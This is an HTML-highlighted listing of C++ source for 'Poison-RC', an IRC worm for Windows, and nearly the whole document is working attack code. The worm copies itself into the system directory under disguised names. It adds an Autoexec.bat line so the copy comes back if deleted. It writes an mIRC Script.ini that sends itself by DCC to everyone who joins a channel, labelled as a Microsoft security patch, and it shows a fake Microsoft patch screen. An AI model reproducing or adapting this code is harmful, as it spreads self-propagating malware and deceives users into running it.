<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>IRC-Worm.Win32.Toush - Poison-RC.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//Poison-RC: IRC worm coded by aLL3GrO
//W32.Poison-RC.Worm, IRC.Poison-RC.Worm
//Simple mIRC propagating worm with Anti-Deletion routine
//For educational purpose only. DO NOT RELEASE
</span><span class="sc0">
</span><span class="sc9">#include &lt;iostream.h&gt;
#include &lt;stdio.h&gt;
#include &lt;windows.h&gt;
#include &lt;dir.h&gt;
#include &lt;string.h&gt;
</span><span class="sc0">
</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc0"> </span><span class="sc11">ffblk</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">re</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc10">,*</span><span class="sc11">start</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">SysDir</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">]={</span><span class="sc6">" "</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dcc</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">]={</span><span class="sc6">" "</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pt</span><span class="sc10">[</span><span class="sc4">50</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">source</span><span class="sc10">[</span><span class="sc4">70</span><span class="sc10">])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">bak</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">]={</span><span class="sc6">" "</span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">del</span><span class="sc10">[</span><span class="sc4">100</span><span class="sc10">]={</span><span class="sc6">" "</span><span class="sc10">};</span><span class="sc0">
  </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">SysDir</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">SysDir</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">bak</span><span class="sc10">,</span><span class="sc11">SysDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">SysDir</span><span class="sc10">,</span><span class="sc6">"\\q160301.exe"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">bak</span><span class="sc10">,</span><span class="sc6">"\\krnl.dll"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">,</span><span class="sc11">SysDir</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">source</span><span class="sc10">,</span><span class="sc11">bak</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">start</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc6">"c:\\Autoexec.bat"</span><span class="sc10">,</span><span class="sc6">"a"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc6">"@echo off\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc6">"@if not exist "</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc11">SysDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc6">" copy "</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc11">bak</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc11">SysDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">del</span><span class="sc10">,</span><span class="sc6">"\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc11">del</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">,</span><span class="sc6">"@cls"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">start</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">pt</span><span class="sc10">,</span><span class="sc6">"Script.ini"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">s</span><span class="sc10">=</span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">pt</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc6">"[Script]\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc6">"n0=on 1:join:#:if $me != $nick .msg $nick Here is the latest security patch from Microsoft\n"</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">dcc</span><span class="sc10">,</span><span class="sc6">"n1=on 1:join:#:if $me != $nick .dcc send $nick "</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">dcc</span><span class="sc10">,</span><span class="sc11">SysDir</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fprintf</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dcc</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">argc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">argv</span><span class="sc10">[])</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">any</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">re</span><span class="sc10">=</span><span class="sc11">findfirst</span><span class="sc10">(</span><span class="sc6">"c:\\mirc\\mirc32.exe"</span><span class="sc10">,&amp;</span><span class="sc11">ffblk</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">re</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc6">"c:\\mirc\\"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">re</span><span class="sc10">=</span><span class="sc11">findfirst</span><span class="sc10">(</span><span class="sc6">"c:\\mirc32\\mirc32.exe"</span><span class="sc10">,&amp;</span><span class="sc11">ffblk</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">re</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc6">"c:\\mirc32\\"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">re</span><span class="sc10">=</span><span class="sc11">findfirst</span><span class="sc10">(</span><span class="sc6">"c:\\irc\\mirc32.exe"</span><span class="sc10">,&amp;</span><span class="sc11">ffblk</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">re</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc6">"c:\\irc\\"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">re</span><span class="sc10">=</span><span class="sc11">findfirst</span><span class="sc10">(</span><span class="sc6">"c:\\chat\\mirc32.exe"</span><span class="sc10">,&amp;</span><span class="sc11">ffblk</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">re</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc6">"c:\\chat\\"</span><span class="sc10">,</span><span class="sc11">argv</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">cout</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Microsoft Security Bulletin q160301 - IE5 ""Toushey"" Vulnerability Patch"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">cout</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Copyright (C) 2001 Microsoft Corp. All Rights Reserved"</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">cout</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc11">endl</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">cout</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Press ""P"" and then Enter to install patch...."</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">cin</span><span class="sc0"> </span><span class="sc10">&gt;&gt;</span><span class="sc0"> </span><span class="sc11">any</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">cout</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc6">"Patch successful !"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
